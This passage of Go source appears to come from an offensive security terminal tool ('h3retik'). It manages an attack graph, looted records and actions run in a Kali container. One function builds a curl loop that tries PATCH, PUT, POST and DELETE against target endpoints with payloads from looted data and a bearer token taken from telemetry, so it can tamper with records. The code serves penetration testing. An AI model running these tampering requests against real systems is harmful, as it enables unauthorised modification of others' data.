	return controlAction{
		Label:       "Credential Fit Scan",
		Description: description,
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc " + shellQuote(shell),
		KaliShell:   shell,
	}, true
}

func templateFromJSONRecord(record map[string]any) string {
	if len(record) == 0 {
		return "{}"
	}
	copyRecord := map[string]any{}
	for key, value := range record {
		copyRecord[key] = value
	}
	delete(copyRecord, "id")
	delete(copyRecord, "createdAt")
	delete(copyRecord, "updatedAt")
	delete(copyRecord, "deletedAt")
	if len(copyRecord) == 0 {
		return "{}"
	}
	serialized, err := json.Marshal(copyRecord)
	if err != nil || strings.TrimSpace(string(serialized)) == "" {
		return "{}"
	}
	return string(serialized)
}

func jsonRecordMaps(value any) []map[string]any {
	if value == nil {
		return nil
	}
	convertArray := func(items []any) []map[string]any {
		out := make([]map[string]any, 0, len(items))
		for _, item := range items {
			if rec, ok := item.(map[string]any); ok {
				out = append(out, rec)
			}
		}
		return out
	}
	switch typed := value.(type) {
	case []any:
		return convertArray(typed)
	case map[string]any:
		for _, key := range []string{"data", "results", "items", "rows"} {
			if raw, ok := typed[key]; ok {
				if arr, ok := raw.([]any); ok {
					return convertArray(arr)
				}
			}
		}
	}
	return nil
}

func (m model) archGraphRecordEditActions(node attackGraphNode) []controlAction {
	if strings.TrimSpace(m.archGraphLastNodeID) == "" || !strings.EqualFold(strings.TrimSpace(m.archGraphLastNodeID), strings.TrimSpace(node.ID)) {
		return nil
	}
	output := strings.TrimSpace(m.archGraphLastResult)
	if output == "" {
		return nil
	}
	_, headers, body, isHTTP := parseLastHTTPResponse(output)
	content := body
	if !isHTTP {
		content = output
	}
	ctype := outputContentType(headers, content)
	if !strings.Contains(ctype, "json") {
		return nil
	}
	value, ok := parseJSONBody(content)
	if !ok {
		return nil
	}
	records := jsonRecordMaps(value)
	if len(records) == 0 {
		return nil
	}
	baseEndpoint := rebaseEndpointForKali(node.Ref, m.state)
	if strings.TrimSpace(baseEndpoint) == "" {
		baseEndpoint = normalizeLootEndpoint(kaliTargetURL(m.state), node.Ref)
	}
	baseEndpoint = strings.TrimRight(strings.TrimSpace(baseEndpoint), "/")
	if baseEndpoint == "" {
		return nil
	}
	actions := make([]controlAction, 0, min(12, len(records)))
	for idx, record := range records {
		if idx >= 12 {
			break
		}
		idRaw, ok := record["id"]
		if !ok {
			continue
		}
		idText := strings.TrimSpace(fmt.Sprintf("%v", idRaw))
		idText = strings.TrimSuffix(idText, ".0")
		if idText == "" {
			continue
		}
		endpoint := strings.TrimRight(baseEndpoint, "/") + "/" + strings.TrimLeft(idText, "/")
		payload := templateFromJSONRecord(record)
		nameText := strings.TrimSpace(fmt.Sprintf("%v", record["name"]))
		if nameText == "" || strings.EqualFold(nameText, "<nil>") {
			nameText = "record"
		}
		q := url.Values{}
		q.Set("endpoint", endpoint)
		q.Set("payload", payload)
		q.Set("method", "PATCH")
		actions = append(actions, controlAction{
			Label:       fmt.Sprintf("Prepare Edit Session :: #%s %s", idText, truncate(nameText, 28)),
			Description: "Load selected record endpoint/payload into editor.",
			Mode:        "internal",
			Command:     "arch:editor:load?" + q.Encode(),
		})
	}
	return actions
}

func (m *model) cycleArchGraphAction(delta int) {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		m.archGraphActionIdx = 0
		return
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	actions := m.archGraphActionsForNode(nodes[current])
	if len(actions) == 0 {
		m.archGraphActionIdx = 0
		m.archGraphStatus = "selected node has no runnable actions"
		return
	}
	m.archGraphActionIdx = clampWrap(m.archGraphActionIdx+delta, len(actions))
	role := graphActionRole(actions[m.archGraphActionIdx])
	m.archGraphStatus = "action :: " + strings.ToLower(role) + " :: " + truncate(actions[m.archGraphActionIdx].Label, 56)
}

func (m *model) ensureArchGraphActionSelection() {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		m.archGraphActionIdx = 0
		return
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	actions := m.archGraphActionsForNode(nodes[current])
	if len(actions) == 0 {
		m.archGraphActionIdx = 0
		return
	}
	m.archGraphActionIdx = clampWrap(m.archGraphActionIdx, len(actions))
}

func (m model) preflightArchGraphAction(action controlAction) (bool, string) {
	if strings.EqualFold(strings.TrimSpace(action.Mode), "internal") {
		return true, ""
	}
	if strings.TrimSpace(action.Command) == "" && strings.TrimSpace(action.KaliShell) == "" {
		return false, "no runnable command"
	}
	snap := deriveChainSnapshot(m.commands, m.findings, m.loot)
	if ok, reason := requirementsReady(action.Requires, snap); !ok {
		return false, reason
	}
	mode := strings.ToLower(strings.TrimSpace(action.Mode))
	switch mode {
	case "kali":
		if strings.TrimSpace(action.KaliShell) == "" {
			return false, "missing kali shell command"
		}
		return m.kaliPreflight(action)
	case "local":
		if len(action.Args) == 0 && strings.TrimSpace(action.Command) == "" {
			return false, "missing local command"
		}
	}
	return true, ""
}

func (m *model) selectArchActionByNumber(idx int) bool {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		m.archGraphStatus = "action select :: no graph node"
		return false
	}
	nodeIdx := clampWrap(m.archGraphIdx, len(nodes))
	actions := m.archGraphActionsForNode(nodes[nodeIdx])
	if len(actions) == 0 {
		m.archGraphActionIdx = 0
		m.archGraphStatus = "action select :: node has no runnable actions"
		return false
	}
	if idx < 0 || idx >= len(actions) {
		return false
	}
	m.archGraphActionIdx = idx
	selected := actions[idx]
	role := graphActionRole(selected)
	ready, reason := m.preflightArchGraphAction(selected)
	if ready {
		m.archGraphStatus = "action selected :: " + strings.ToLower(role) + " :: ready :: " + truncate(selected.Label, 52)
	} else if strings.TrimSpace(reason) != "" {
		m.archGraphStatus = "action selected :: " + strings.ToLower(role) + " :: blocked (" + reason + ")"
	} else {
		m.archGraphStatus = "action selected :: " + strings.ToLower(role) + " :: blocked"
	}
	return true
}

func (m *model) previewArchSelectedAction() {
	node, selected, ok := m.selectedArchNodeAndAction()
	if !ok {
		m.archGraphStatus = "preview unavailable :: no graph node/action selected"
		return
	}
	action := selected
	if edited, useEdited := m.buildArchEditAction(node, selected); useEdited {
		action = edited
	}
	role := graphActionRole(action)
	target := endpointFromAction(action)
	if strings.TrimSpace(target) == "" {
		target = strings.TrimSpace(m.archEditEndpoint)
	}
	ready, reason := m.preflightArchGraphAction(action)
	stateLabel := "READY"
	if !ready {
		stateLabel = "BLOCKED"
	}
	statusLine := "preview :: " + strings.ToLower(role) + " :: " + strings.ToLower(stateLabel)
	if strings.TrimSpace(reason) != "" {
		statusLine += " :: " + reason
	}
	m.archGraphStatus = statusLine
	commandText := strings.TrimSpace(valueOr(action.Command, action.KaliShell))
	if commandText == "" {
		commandText = "no runnable command"
	}
	if strings.EqualFold(strings.TrimSpace(action.Mode), "internal") && strings.HasPrefix(strings.TrimSpace(action.Command), "arch:editor:load?") {
		values, err := url.ParseQuery(strings.TrimPrefix(strings.TrimSpace(action.Command), "arch:editor:load?"))
		if err == nil {
			commandText = strings.Join([]string{
				metricLine("internal action", "load editor from record"),
				metricLine("method", strings.ToUpper(valueOr(strings.TrimSpace(values.Get("method")), "PATCH"))),
				metricLine("endpoint", valueOr(strings.TrimSpace(values.Get("endpoint")), "n/a")),
				metricLine("payload", truncate(valueOr(strings.TrimSpace(values.Get("payload")), "{}"), 220)),
			}, "\n")
		}
	}
	previewLines := []string{
		metricLine("preview", valueOr(strings.TrimSpace(action.Label), "map action")),
		metricLine("role", role),
		metricLine("runtime", strings.ToUpper(valueOr(strings.TrimSpace(action.Mode), "local"))),
		metricLine("target", valueOr(strings.TrimSpace(target), "n/a")),
		metricLine("check", stateLabel+ternary(strings.TrimSpace(reason) != "", " :: "+reason, "")),
		"",
		metricLine("description", valueOr(strings.TrimSpace(action.Description), graphRoleDescription(role))),
		metricLine("execute", "press f to run selected action"),
		"",
		lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("command preview"),
		wrap(commandText, max(24, m.width/2)),
	}
	m.archGraphCommand = commandText
	m.archGraphOutput = strings.Join(previewLines, "\n")
	m.commandDetailScroll = 0
}

func (m *model) collapseArchSelected() bool {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		return false
	}
	if m.archCollapsed == nil {
		m.archCollapsed = map[string]bool{}
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	node := nodes[current]
	children := buildGraphChildrenIndex(nodes)
	if len(children[node.ID]) == 0 {
		return false
	}
	m.archCollapsed[node.ID] = true
	m.archGraphStatus = "collapsed :: " + node.Label
	return true
}

func (m *model) expandArchSelected() bool {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		return false
	}
	if m.archCollapsed == nil {
		m.archCollapsed = map[string]bool{}
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	node := nodes[current]
	if !m.archCollapsed[node.ID] {
		return false
	}
	delete(m.archCollapsed, node.ID)
	m.archGraphStatus = "expanded :: " + node.Label
	return true
}

func archMethodFromAction(action controlAction) string {
	meta := strings.ToUpper(strings.TrimSpace(action.KaliShell + " " + action.Command))
	switch {
	case strings.Contains(meta, "-X PATCH"):
		return "PATCH"
	case strings.Contains(meta, "-X PUT"):
		return "PUT"
	case strings.Contains(meta, "-X DELETE"):
		return "DELETE"
	case strings.Contains(meta, "-X POST"):
		return "POST"
	default:
		return "GET"
	}
}

func endpointFromAction(action controlAction) string {
	re := regexp.MustCompile(`https?://[^\s'"]+`)
	candidates := []string{
		strings.TrimSpace(action.KaliShell),
		strings.TrimSpace(action.Command),
	}
	for _, text := range candidates {
		match := re.FindString(text)
		if strings.TrimSpace(match) != "" {
			return strings.TrimSpace(match)
		}
	}
	return ""
}

func seedArchEditPayloadForNode(node attackGraphNode, loot []lootEntry) string {
	candidates := []string{}
	ref := strings.ToLower(strings.TrimSpace(node.Ref))
	label := strings.ToLower(strings.TrimSpace(node.Label))
	for _, item := range loot {
		meta := strings.ToLower(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview)
		if ref != "" && !strings.Contains(meta, ref) && (label == "" || !strings.Contains(meta, label)) {
			continue
		}
		if strings.Contains(strings.TrimSpace(item.Preview), "{") {
			candidates = append(candidates, strings.TrimSpace(item.Preview))
		}
	}
	for _, raw := range candidates {
		var value any
		if err := json.Unmarshal([]byte(raw), &value); err != nil {
			continue
		}
		var obj map[string]any
		switch typed := value.(type) {
		case map[string]any:
			obj = typed
		case []any:
			if len(typed) > 0 {
				if first, ok := typed[0].(map[string]any); ok {
					obj = first
				}
			}
		}
		if obj == nil {
			continue
		}
		delete(obj, "id")
		delete(obj, "createdAt")
		delete(obj, "updatedAt")
		delete(obj, "deletedAt")
		buf, err := json.Marshal(obj)
		if err == nil && strings.TrimSpace(string(buf)) != "" && string(buf) != "{}" {
			return string(buf)
		}
	}
	return "{}"
}

func (m *model) startArchEditInput(kind string) {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		m.archGraphStatus = "edit unavailable :: no graph node"
		return
	}
	current := clampWrap(m.archGraphIdx, len(nodes))
	node := nodes[current]
	actions := m.archGraphActionsForNode(node)
	if len(actions) == 0 {
		m.archGraphStatus = "edit unavailable :: no runnable action on selected node"
		return
	}
	selected, ok := m.selectOrPrepareArchEditAction(node, actions)
	if !ok {
		m.archGraphStatus = "edit unavailable :: selected node has no edit-capable action"
		return
	}
	m.hydrateArchEditBuffer(node, selected)
	m.archEditEnabled = true
	m.manualTargetMode = true
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "endpoint":
		m.manualTargetKind = "arch-edit-endpoint"
		m.manualTargetInput = strings.TrimSpace(m.archEditEndpoint)
		m.archGraphStatus = "edit endpoint :: input active"
	default:
		m.manualTargetKind = "arch-edit-payload"
		payload := strings.TrimSpace(m.archEditPayload)
		if payload == "" {
			payload = "{}"
		}
		m.manualTargetInput = payload
		m.archGraphStatus = "edit payload :: input active"
	}
}

func isArchEditorLoadAction(action controlAction) bool {
	if !strings.EqualFold(strings.TrimSpace(action.Mode), "internal") {
		return false
	}
	return strings.HasPrefix(strings.TrimSpace(action.Command), "arch:editor:load?")
}

func (m *model) selectOrPrepareArchEditAction(node attackGraphNode, actions []controlAction) (controlAction, bool) {
	if len(actions) == 0 {
		return controlAction{}, false
	}
	current := clampWrap(m.archGraphActionIdx, len(actions))
	selected := actions[current]
	if isArchEditorLoadAction(selected) {
		m.applyInternalArchGraphAction(node, selected)
		return selected, true
	}
	role := graphActionRole(selected)
	if role == "MODIFY" || role == "TAMPER" {
		return selected, true
	}
	for idx, candidate := range actions {
		if !isArchEditorLoadAction(candidate) {
			continue
		}
		m.archGraphActionIdx = idx
		m.applyInternalArchGraphAction(node, candidate)
		return candidate, true
	}
	for idx, candidate := range actions {
		candidateRole := graphActionRole(candidate)
		if candidateRole != "MODIFY" && candidateRole != "TAMPER" {
			continue
		}
		m.archGraphActionIdx = idx
		return candidate, true
	}
	return controlAction{}, false
}

func (m *model) hydrateArchEditBuffer(node attackGraphNode, action controlAction) {
	if strings.EqualFold(strings.TrimSpace(action.Mode), "internal") {
		return
	}
	if strings.TrimSpace(m.archEditMethod) == "" {
		m.archEditMethod = archMethodFromAction(action)
	}
	if strings.TrimSpace(m.archEditEndpoint) == "" {
		endpoint := endpointFromAction(action)
		if endpoint == "" {
			endpoint = rebaseEndpointForKali(node.Ref, m.state)
		}
		if endpoint == "" {
			endpoint = strings.TrimRight(kaliTargetURL(m.state), "/")
		}
		m.archEditEndpoint = endpoint
	}
	if strings.TrimSpace(m.archEditPayload) == "" || strings.EqualFold(strings.TrimSpace(m.archEditPayload), "{}") {
		exploitLoot := lootByMode(m.loot, "exploit")
		m.archEditPayload = seedArchEditPayloadForNode(node, exploitLoot)
	}
	m.syncArchEditableFieldSelection()
}

func (m *model) cycleArchEditMethod(delta int) {
	methods := []string{"AUTO", "GET", "POST", "PUT", "PATCH", "DELETE"}
	current := strings.ToUpper(strings.TrimSpace(m.archEditMethod))
	pos := 0
	for idx, method := range methods {
		if method == current {
			pos = idx
			break
		}
	}
	pos = clampWrap(pos+delta, len(methods))
	m.archEditMethod = methods[pos]
	m.archEditEnabled = true
	m.archGraphStatus = "edit method :: " + m.archEditMethod
}

func (m *model) submitManualArchEditEndpoint() tea.Cmd {
	endpoint := strings.TrimSpace(m.manualTargetInput)
	m.manualTargetMode = false
	if endpoint == "" {
		m.archGraphStatus = "edit endpoint rejected :: empty value"
		return nil
	}
	if !strings.HasPrefix(strings.ToLower(endpoint), "http://") && !strings.HasPrefix(strings.ToLower(endpoint), "https://") {
		endpoint = normalizeLootEndpoint(strings.TrimRight(kaliTargetURL(m.state), "/"), endpoint)
	}
	m.archEditEndpoint = endpoint
	m.archEditEnabled = true
	m.archGraphStatus = "edit endpoint set :: " + truncate(endpoint, 64)
	return nil
}

func (m *model) submitManualArchEditPayload() tea.Cmd {
	payload := strings.TrimSpace(m.manualTargetInput)
	m.manualTargetMode = false
	if payload == "" {
		m.archGraphStatus = "edit payload rejected :: empty value"
		return nil
	}
	m.archEditPayload = payload
	m.archEditEnabled = true
	m.syncArchEditableFieldSelection()
	m.archGraphStatus = "edit payload set :: " + truncate(payload, 64)
	return nil
}

func parseJSONPayloadObject(payload string) (map[string]any, bool) {
	var obj map[string]any
	if err := json.Unmarshal([]byte(strings.TrimSpace(payload)), &obj); err != nil {
		return nil, false
	}
	if obj == nil {
		return nil, false
	}
	return obj, true
}

func scalarPayloadFieldKeys(obj map[string]any) []string {
	if len(obj) == 0 {
		return nil
	}
	keys := make([]string, 0, len(obj))
	for key, value := range obj {
		switch value.(type) {
		case map[string]any, []any:
			continue
		default:
			keys = append(keys, key)
		}
	}
	sort.Strings(keys)
	return keys
}

func archPayloadFieldKeys(payload string) []string {
	obj, ok := parseJSONPayloadObject(payload)
	if !ok {
		return nil
	}
	return scalarPayloadFieldKeys(obj)
}

func (m *model) syncArchEditableFieldSelection() {
	fields := archPayloadFieldKeys(m.archEditPayload)
	if len(fields) == 0 {
		m.archEditFieldIdx = 0
		return
	}
	m.archEditFieldIdx = clampWrap(m.archEditFieldIdx, len(fields))
}

func (m model) selectedArchPayloadField() (string, string, bool) {
	fields := archPayloadFieldKeys(m.archEditPayload)
	if len(fields) == 0 {
		return "", "", false
	}
	idx := clampWrap(m.archEditFieldIdx, len(fields))
	field := fields[idx]
	obj, ok := parseJSONPayloadObject(m.archEditPayload)
	if !ok {
		return field, "", true
	}
	valueText := truncateValue(obj[field], 96)
	return field, valueText, true
}

func inferFieldValueFromInput(input string, current any) (any, error) {
	trimmed := strings.TrimSpace(input)
	if strings.HasPrefix(strings.ToLower(trimmed), "json:") {
		raw := strings.TrimSpace(strings.TrimPrefix(trimmed, "json:"))
		if raw == "" {
			return nil, fmt.Errorf("json payload is empty")
		}
		var value any
		if err := json.Unmarshal([]byte(raw), &value); err != nil {
			return nil, fmt.Errorf("invalid json value")
		}
		return value, nil
	}
	if strings.EqualFold(trimmed, "null") {
		return nil, nil
	}
	switch current.(type) {
	case bool:
		parsed, err := strconv.ParseBool(strings.ToLower(trimmed))
		if err != nil {
			return nil, fmt.Errorf("expected bool (true/false)")
		}
		return parsed, nil
	case float64:
		if strings.Contains(trimmed, ".") {
			parsed, err := strconv.ParseFloat(trimmed, 64)
			if err != nil {
				return nil, fmt.Errorf("expected number")
			}
			return parsed, nil
		}
		parsed, err := strconv.Atoi(trimmed)
		if err == nil {
			return float64(parsed), nil
		}
		parsedFloat, floatErr := strconv.ParseFloat(trimmed, 64)
		if floatErr != nil {
			return nil, fmt.Errorf("expected number")
		}
		return parsedFloat, nil
	}
	if parsed, err := strconv.ParseBool(strings.ToLower(trimmed)); err == nil {
		return parsed, nil
	}
	if parsedInt, err := strconv.Atoi(trimmed); err == nil {
		return float64(parsedInt), nil
	}
	if parsedFloat, err := strconv.ParseFloat(trimmed, 64); err == nil && strings.Contains(trimmed, ".") {
		return parsedFloat, nil
	}
	return input, nil
}

func (m *model) cycleArchEditableField(delta int) {
	if !m.ensureArchFieldEditorReady() {
		m.archGraphStatus = "field editor unavailable :: inspect node once, then use selected/auto edit action"
		return
	}
	fields := archPayloadFieldKeys(m.archEditPayload)
	if len(fields) == 0 {
		m.archGraphStatus = "field editor unavailable :: payload has no scalar fields"
		return
	}
	m.archEditFieldIdx = clampWrap(m.archEditFieldIdx+delta, len(fields))
	field := fields[m.archEditFieldIdx]
	obj, _ := parseJSONPayloadObject(m.archEditPayload)
	m.archGraphStatus = "field selected :: " + field + " = " + truncateValue(obj[field], 56)
}

func (m *model) startArchEditFieldValueInput() {
	if !m.ensureArchFieldEditorReady() {
		m.archGraphStatus = "field edit unavailable :: no editable payload loaded (run inspect or load edit session)"
		return
	}
	fields := archPayloadFieldKeys(m.archEditPayload)
	if len(fields) == 0 {
		m.archGraphStatus = "field editor unavailable :: payload has no scalar fields"
		return
	}
	idx := clampWrap(m.archEditFieldIdx, len(fields))
	field := fields[idx]
	obj, _ := parseJSONPayloadObject(m.archEditPayload)
	m.manualTargetMode = true
	m.manualTargetKind = "arch-edit-field-value"
	m.manualTargetInput = fmt.Sprintf("%v", obj[field])
	m.archGraphStatus = "field input active :: " + field
}

func (m *model) ensureArchFieldEditorReady() bool {
	if len(archPayloadFieldKeys(m.archEditPayload)) > 0 {
		return true
	}
	node, selected, ok := m.selectedArchNodeAndAction()
	if ok {
		if isArchEditorLoadAction(selected) {
			m.applyInternalArchGraphAction(node, selected)
			if len(archPayloadFieldKeys(m.archEditPayload)) > 0 {
				return true
			}
		}
		actions := m.archGraphActionsForNode(node)
		for idx, candidate := range actions {
			if !isArchEditorLoadAction(candidate) {
				continue
			}
			m.archGraphActionIdx = idx
			m.applyInternalArchGraphAction(node, candidate)
			if len(archPayloadFieldKeys(m.archEditPayload)) > 0 {
				return true
			}
		}
		role := graphActionRole(selected)
		if role == "MODIFY" || role == "TAMPER" {
			m.hydrateArchEditBuffer(node, selected)
			if len(archPayloadFieldKeys(m.archEditPayload)) > 0 {
				return true
			}
		}
	}
	if template, ok := extractJSONTemplate(m.archGraphLastResult); ok {
		m.archEditPayload = template
		m.archEditEnabled = true
		m.syncArchEditableFieldSelection()
		if len(archPayloadFieldKeys(m.archEditPayload)) > 0 {
			return true
		}
	}
	return false
}

func (m *model) submitManualArchEditFieldValue() tea.Cmd {
	valueText := strings.TrimSpace(m.manualTargetInput)
	m.manualTargetMode = false
	fields := archPayloadFieldKeys(m.archEditPayload)
	if len(fields) == 0 {
		m.archGraphStatus = "field update failed :: payload has no editable scalar fields"
		return nil
	}
	idx := clampWrap(m.archEditFieldIdx, len(fields))
	field := fields[idx]
	obj, ok := parseJSONPayloadObject(m.archEditPayload)
	if !ok {
		m.archGraphStatus = "field update failed :: payload is not valid json object"
		return nil
	}
	current := obj[field]
	nextValue, err := inferFieldValueFromInput(valueText, current)
	if err != nil {
		m.archGraphStatus = "field update failed :: " + err.Error()
		return nil
	}
	obj[field] = nextValue
	serialized, err := json.Marshal(obj)
	if err != nil {
		m.archGraphStatus = "field update failed :: cannot serialize payload"
		return nil
	}
	m.archEditPayload = string(serialized)
	m.archEditEnabled = true
	m.syncArchEditableFieldSelection()
	m.archGraphStatus = "field updated :: " + field + " = " + truncateValue(nextValue, 64)
	return nil
}

func (m *model) selectedArchNodeAndAction() (attackGraphNode, controlAction, bool) {
	nodes := m.exploitGraphNodes()
	if len(nodes) == 0 {
		return attackGraphNode{}, controlAction{}, false
	}
	idx := clampWrap(m.archGraphIdx, len(nodes))
	node := nodes[idx]
	actions := m.archGraphActionsForNode(node)
	if len(actions) == 0 {
		return node, controlAction{}, false
	}
	action := actions[clampWrap(m.archGraphActionIdx, len(actions))]
	return node, action, true
}

func (m model) buildArchEditAction(node attackGraphNode, baseAction controlAction) (controlAction, bool) {
	if !m.archEditEnabled {
		return controlAction{}, false
	}
	role := graphActionRole(baseAction)
	if role != "MODIFY" && role != "TAMPER" {
		return controlAction{}, false
	}
	method := strings.ToUpper(strings.TrimSpace(valueOr(m.archEditMethod, "AUTO")))
	baseMethod := strings.ToUpper(strings.TrimSpace(archMethodFromAction(baseAction)))
	methods := []string{}
	if method == "" || method == "AUTO" {
		if baseMethod != "" && baseMethod != "GET" {
			methods = append(methods, baseMethod)
		}
		methods = append(methods, "PATCH", "PUT", "POST", "DELETE")
		seen := map[string]bool{}
		filtered := make([]string, 0, len(methods))
		for _, candidate := range methods {
			if candidate == "" || seen[candidate] {
				continue
			}
			seen[candidate] = true
			filtered = append(filtered, candidate)
		}
		methods = filtered
	} else {
		methods = []string{method}
	}
	endpoint := strings.TrimSpace(m.archEditEndpoint)
	if endpoint == "" {
		endpoint = endpointFromAction(baseAction)
	}
	if endpoint == "" {
		endpoint = rebaseEndpointForKali(node.Ref, m.state)
	}
	if endpoint == "" {
		return controlAction{}, false
	}
	payload := strings.TrimSpace(m.archEditPayload)
	if payload == "" {
		payload = "{}"
	}
	authHeader := ""
	token := ""
	if m.archEditUseToken {
		if discovered := strings.TrimSpace(latestTokenFromTelemetry(m.root)); discovered != "" {
			token = discovered
			authHeader = "enabled"
		}
	}
	methodList := "'" + strings.Join(methods, "' '") + "'"
	shell := "endpoint=" + shellQuote(endpoint) + "; payload=" + shellQuote(payload) + "; token=" + shellQuote(token) + "; ok=0; " +
		"for m in " + methodList + "; do " +
		"echo \"[method:$m]\"; " +
		"if [ \"$m\" = \"GET\" ] || [ \"$m\" = \"DELETE\" ]; then " +
		"if [ -n \"$token\" ]; then out=$(curl -sS -i -X \"$m\" \"$endpoint\" -H \"Authorization: Bearer $token\"); " +
		"else out=$(curl -sS -i -X \"$m\" \"$endpoint\"); fi; " +
		"else " +
		"if [ -n \"$token\" ]; then out=$(curl -sS -i -X \"$m\" \"$endpoint\" -H \"Authorization: Bearer $token\" -H \"Content-Type: application/json\" --data \"$payload\"); " +
		"else out=$(curl -sS -i -X \"$m\" \"$endpoint\" -H \"Content-Type: application/json\" --data \"$payload\"); fi; " +
		"fi; " +
		"echo \"$out\"; code=$(printf '%s\\n' \"$out\" | awk 'toupper($1) ~ /^HTTP\\// {print $2; exit}'); " +
		"if [ -n \"$code\" ] && [ \"$code\" -ge 200 ] 2>/dev/null && [ \"$code\" -lt 400 ] 2>/dev/null; then ok=1; break; fi; " +
		"done; if [ \"$ok\" -eq 0 ]; then exit 1; fi"
	return controlAction{
		Label:       "Map Edit :: " + method + " " + truncate(endpoint, 48),
		Description: "Interactive map edit buffer execution (" + authHeader + ")",
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc " + shellQuote(shell),
		KaliShell:   shell,
	}, true
}

func (m *model) applyModeHotkey() {
	if m.tab == 3 {
		m.lootFogMode = !m.lootFogMode
		m.lootRawMode = false
		m.lootDetailScroll = 0
		m.ensureLootSelection()
		if m.lootFogMode {
			m.lootFogStageIdx = 0
			m.lootFogActionIdx = 0
			m.controlStatus = "ok :: LOOT switched to FOG-OF-WAR mission view"
		} else {
			m.controlStatus = "ok :: LOOT switched to EXPLOIT view"
		}
		return
	}
	if m.tab == 4 {
		if strings.EqualFold(m.fireMode, "osint") {
			m.fireMode = "exploit"
		} else {
			m.fireMode = "osint"
		}
		m.exploitPipelineMenu = false
		m.controlSection = 2
		m.fireIdx = 0
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: CTRL mode -> " + strings.ToUpper(m.fireMode)
	}
}

func (m *model) applyMapHotkey() {
	if m.tab != 0 {
		return
	}
	if !strings.EqualFold(strings.TrimSpace(m.fireMode), "exploit") {
		return
	}
	m.archMapMode = !m.archMapMode
	m.archGraphOutput = ""
	m.archOutputRaw = false
	if m.archMapMode {
		m.archCollapsed = map[string]bool{}
		m.archGraphActionIdx = 0
		m.archEditEnabled = false
	}
	m.archGraphStatus = ternary(m.archMapMode, "ok :: ARCH map mode enabled", "ok :: ARCH map mode disabled")
}

func (m *model) applyChainHotkey() {
	if m.tab == 3 {
		m.lootOnchainMode = !m.lootOnchainMode
		if m.lootOnchainMode {
			m.lootOSINTMode = false
			m.lootFogMode = false
		}
		m.lootRawMode = false
		m.lootDetailScroll = 0
		m.ensureLootSelection()
		if m.lootOnchainMode {
			m.controlStatus = "ok :: LOOT switched to ONCHAIN view"
		} else {
			m.controlStatus = "ok :: LOOT switched to EXPLOIT view"
		}
		return
	}
	if m.tab == 4 {
		if strings.EqualFold(m.fireMode, "onchain") {
			m.fireMode = "exploit"
		} else {
			m.fireMode = "onchain"
		}
		m.exploitPipelineMenu = false
		m.controlSection = 2
		m.fireIdx = 0
		m.ensureCommandSelection()
		m.ensureFindingSelection()
		m.controlStatus = "ok :: CTRL mode -> " + strings.ToUpper(m.fireMode)
	}
}

func (m *model) applyCoopHotkey() {
	if m.tab != 4 {
		return
	}
	if strings.EqualFold(m.fireMode, "coop") {
		m.fireMode = "exploit"
	} else {
		m.fireMode = "coop"
	}
	m.exploitPipelineMenu = false
	m.controlSection = 2
	m.fireIdx = 0
	m.ensureCommandSelection()
	m.ensureFindingSelection()
	m.controlStatus = "ok :: CTRL mode -> " + strings.ToUpper(m.fireMode)
}

func (m *model) resetDetailScroll() {
	m.commandDetailScroll = 0
	m.findingDetailScroll = 0
	m.lootDetailScroll = 0
	m.controlDetailScroll = 0
}

func (m *model) ensureLootSelection() {
	prev := m.lootIdx
	order := lootDisplayOrderByMode(m.loot, m.lootOSINTMode, m.lootOnchainMode)
	if len(order) == 0 {
		m.lootIdx = 0
		m.lootActionIdx = 0
		return
	}
	for _, idx := range order {
		if idx == m.lootIdx {
			if prev != m.lootIdx {
				m.lootActionIdx = 0
			}
			return
		}
	}
	m.lootIdx = order[0]
	m.lootActionIdx = 0
}

func (m *model) ensureCommandSelection() {
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	order := commandDisplayOrderByMode(m.commands, mode)
	if len(order) == 0 {
		if len(m.commands) == 0 {
			m.commandIdx = 0
		} else {
			m.commandIdx = clamp(m.commandIdx, 0, len(m.commands)-1)
		}
		return
	}
	if indexInOrder(order, m.commandIdx) < 0 {
		m.commandIdx = order[0]
	}
}

func (m *model) ensureFindingSelection() {
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	if mode == "" {
		mode = "exploit"
	}
	order := findingDisplayOrderByMode(m.findings, mode)
	if len(order) == 0 {
		if len(m.findings) == 0 {
			m.findingIdx = 0
		} else {
			m.findingIdx = clamp(m.findingIdx, 0, len(m.findings)-1)
		}
		return
	}
	if indexInOrder(order, m.findingIdx) < 0 {
		m.findingIdx = order[0]
	}
}

func (m *model) scrollDetail(delta int) {
	switch m.tab {
	case 0:
		if m.archMapMode {
			m.commandDetailScroll = max(0, m.commandDetailScroll+delta)
		}
	case 1:
		m.commandDetailScroll = max(0, m.commandDetailScroll+delta)
	case 2:
		m.findingDetailScroll = max(0, m.findingDetailScroll+delta)
	case 3:
		m.lootDetailScroll = max(0, m.lootDetailScroll+delta)
	case 4:
		m.controlDetailScroll = max(0, m.controlDetailScroll+delta)
	}
}

func (m *model) reload() {
	if m.moduleInputValues == nil {
		m.moduleInputValues = map[string]string{}
	}
	m.state = loadState(filepath.Join(m.telemetryDir, "state.json"))
	m.rawCommands = loadJSONL[commandEntry](filepath.Join(m.telemetryDir, "commands.jsonl"))
	m.commands = collapseCommandEvents(m.rawCommands)
	prevTopKey := m.lastFindingKey
	loadedFindings := loadJSONL[findingEntry](filepath.Join(m.telemetryDir, "findings.jsonl"))
	m.findings = collapseFindingEvents(loadedFindings)
	if len(m.findings) > 0 {
		top := m.findings[0]
		newTopKey := findingIdentityKey(top)
		m.lastFindingKey = newTopKey
		if prevTopKey != "" && prevTopKey != newTopKey {
			m.findingNotice = truncate(fmt.Sprintf("[%s] %s", strings.ToUpper(top.Severity), top.Title), 72)
